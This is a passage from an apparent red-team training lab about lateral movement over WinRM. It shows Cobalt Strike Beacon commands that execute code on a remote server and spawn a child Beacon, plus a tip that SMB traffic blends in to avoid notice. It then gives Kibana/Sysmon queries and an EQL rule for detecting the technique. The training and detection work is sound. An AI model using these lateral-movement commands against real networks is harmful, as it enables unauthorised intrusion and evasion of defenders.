The `winrm` and `winrm64` methods can be used as appropriate for 32 and 64-bit targets. There are lots of different ways to determine the architecture of a remote system - one example is to use the `Get-WmiObject` PowerShell cmdlet.
```shell
beacon> getuid
[*] You are DEV\bfarmer

beacon> remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
64-bit
```

When moving laterally between targets, I recommend the SMB Beacon. The SMB protocol is used extensively in a Windows environment, so this traffic blends in very well.
```shell
beacon> jump winrm64 srv-1 smb
[+] established link to child beacon: 10.10.17.25
```

WinRM will return a high integrity Beacon running as the user with which you're interacting with the remote machine as.

There are multiple steps to this technique that we leverage to build a detection mechanism.  We can look for **egress** network connections with a destination port of **5985**.
```shell
event.module : sysmon and event.type : connection and network.direction : egress and destination.port : 5985
```


There's the process start event for `wsmprovhost.exe` (with an `-Embedding` parameter in the command line arguments).
```shell
event.module : sysmon and event.type : process_start and process.command_line : "C:\\Windows\\system32\\wsmprovhost.exe -Embedding"
```

PowerShell logging will also provide the script block and/or transactional log, which tells us exactly what code/commands were executed.  Use the `process.pid` field from the previous query to find its associated script block.
```shell
event.module : powershell and winlog.process.pid: 2984
```

The size of the Beacon PowerShell payload is too large to fit into a single log, so in each message you'll see "Creating Scriptblock text (X of Y)".  Each log can be correlated with the `script_block_id` field, which is a GUID.

To automate this, the Security App has a Rule entitled "WinRM Remote Code Execution".  It uses Event Query Language (EQL) which is great for finding relationships between different events.

>Move laterally to SRV-1 using WinRM and investigate the logs in Kibana.
